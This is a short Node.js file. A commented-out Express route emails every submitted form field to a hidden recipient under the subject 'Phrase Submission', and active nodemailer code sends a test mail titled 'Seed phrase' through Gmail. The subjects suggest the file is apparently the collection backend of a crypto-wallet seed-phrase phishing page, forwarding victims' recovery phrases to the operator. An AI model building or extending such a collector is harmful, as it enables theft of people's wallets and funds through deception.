// const express = require('express');
// const bodyParser = require('body-parser');
// const nodemailer = require('nodemailer');
// require('dotenv').config()

// const app = express();
// // const port = process.env.PORT || 3000; // Use environment variable or default to 3000
// const port = process.env.PORT; 

// // Configure body-parser to handle form data
// app.use(bodyParser.urlencoded({ extended: true }));

// // Replace these with your email credentials
// const senderEmail = process.env.SENDERMAIL;
// // console.log(senderEmail)
// const senderPassword = process.env.SENDERPASS;
// // console.log(senderPassword)


// // Configure email transporter (replace with your preferred service)
// const transporter = nodemailer.createTransport({
//   service: 'gmail', // Replace with your email service
//   auth: {
//     user: senderEmail,
//     pass: senderPassword
//   }
// });

// // Route to handle form submission (POST request)
// app.post('/', (req, res) => {
//   const formData = req.body; // Access form data from request body

//   // Validate data if needed (optional)

//   const emailBody = `
//     New submission received:
//     ${Object.entries(formData).map(([key, value]) => `- ${key}: ${value}`).join('\n')}
//   `;

//   const mailOptions = {
//     from: senderEmail,
//     to: process.env.RECEIVERMAIL, // Replace with recipient email
//     subject: 'Phrase Submission ',
//     text: emailBody
//   };

//   transporter.sendMail(mailOptions, (error, info) => {
//     if (error) {
//       console.error(error);
//       res.status(500).send('Error sending email');
//     } else {
//       console.log('Email sent: ' + info.response);
//       res.status(200).send('Form submitted successfully!');
//     }
//   });
// });

// app.listen(port, () => console.log(`Server listening on port ${port}`));


const  nodemailer = require('nodemailer');
require('dotenv').config();

const transporter = nodemailer.createTransport({
  service: 'gmail',
  host: "smtp.gmail.com",
  port: 587,
  secure: false,
  auth: {
    user: process.env.SENDERMAIL,
    pass: process.env.APPPASS
  },
})

transporter.sendMail({
  to: process.env.RECEIVERMAIL,
  subject: "Seed phrase",
  html: '<h1>Testing mail if sent</h1>'
}).then(() => {
  console.log('Email sent')
}).catch((err) => {
  console.error(err)
})